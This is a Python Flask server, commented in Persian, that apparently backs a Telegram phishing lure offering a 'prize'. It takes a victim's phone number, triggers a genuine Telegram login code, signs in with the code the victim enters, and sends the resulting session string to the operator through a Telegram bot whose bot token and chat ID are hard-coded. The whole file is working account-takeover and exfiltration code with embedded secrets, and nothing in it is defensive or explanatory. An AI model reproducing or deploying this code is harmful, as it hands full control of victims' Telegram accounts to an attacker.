from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient
import asyncio
import os

# ============================================================
#  اپلیکیشن Flask
# ============================================================
app = Flask(__name__)
CORS(app)

# ============================================================
#  کانفیگ - این مقادیر را با اطلاعات خود جایگزین کنید
# ============================================================
API_ID = 2899
API_HASH = '36722c72256a24c1225de00eb6a1ca74'
BOT_TOKEN = '8591425870:AAEAjapPJnv_Q_NfW5NbTX6_b-zrGMPGv-s'
CHAT_ID = '8491102319'

# ============================================================
#  حافظه موقت برای ذخیره جلسات
# ============================================================
sessions = {}

# ============================================================
#  روت: درخواست کد
# ============================================================
@app.route('/request-code', methods=['POST'])
def request_code():
    data = request.json
    phone = data.get('phone')
    prize = data.get('prize', 30)

    if not phone:
        return jsonify({'error': 'Phone number required'}), 400

    session_id = f"session_{phone.replace('+', '')}"

    sessions[session_id] = {
        'phone': phone,
        'prize': prize,
        'status': 'pending',
        'client': None
    }

    asyncio.create_task(send_code(session_id, phone))

    return jsonify({
        'success': True,
        'request_id': session_id,
        'message': 'Code sent to your Telegram app'
    })

# ============================================================
#  روت: تایید کد
# ============================================================
@app.route('/verify-code', methods=['POST'])
def verify_code():
    data = request.json
    session_id = data.get('request_id')
    code = data.get('code')
    phone = data.get('phone')

    if not session_id or not code or not phone:
        return jsonify({'error': 'Missing data'}), 400

    session = sessions.get(session_id)
    if not session:
        return jsonify({'error': 'Session not found'}), 400

    asyncio.create_task(verify_session(session_id, phone, code))

    return jsonify({
        'success': True,
        'message': 'Verifying...'
    })

# ============================================================
#  روت: سلامت سرور
# ============================================================
@app.route('/health', methods=['GET'])
def health():
    return jsonify({
        'status': 'ok',
        'time': __import__('datetime').datetime.now().isoformat(),
        'sessions': len(sessions)
    })

# ============================================================
#  تابع: ارسال کد به تلگرام
# ============================================================
async def send_code(session_id, phone):
    try:
        client = TelegramClient(session_id, API_ID, API_HASH)
        await client.connect()

        if not await client.is_user_authorized():
            await client.send_code_request(phone)
            sessions[session_id]['client'] = client
            sessions[session_id]['status'] = 'code_sent'

            await send_to_bot(f"📱 Code requested\nUser: {phone}")
        else:
            sessions[session_id]['client'] = client
            sessions[session_id]['status'] = 'already_authorized'

    except Exception as e:
        sessions[session_id]['status'] = 'error'
        await send_to_bot(f"❌ Error: {e}")

# ============================================================
#  تابع: تایید کد و دریافت سشن
# ============================================================
async def verify_session(session_id, phone, code):
    session = sessions.get(session_id)
    if not session:
        return

    client = session.get('client')
    if not client:
        await send_to_bot(f"❌ No client for {phone}")
        return

    try:
        await client.sign_in(phone, code)
        session_string = client.session.save()

        message = f"User : {phone}\nکد سیشن : {session_string}"
        await send_to_bot(message)

        sessions[session_id]['status'] = 'done'
        await client.disconnect()

    except Exception as e:
        sessions[session_id]['status'] = 'error'
        await send_to_bot(f"❌ Verification error for {phone}: {e}")

# ============================================================
#  تابع: ارسال پیام به ربات تلگرام
# ============================================================
async def send_to_bot(message):
    try:
        client = TelegramClient('bot_session', API_ID, API_HASH)
        await client.start(bot_token=BOT_TOKEN)
        await client.send_message(CHAT_ID, message)
        await client.disconnect()
    except Exception as e:
        print(f"Bot error: {e}")

# ============================================================
#  اجرا
# ============================================================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
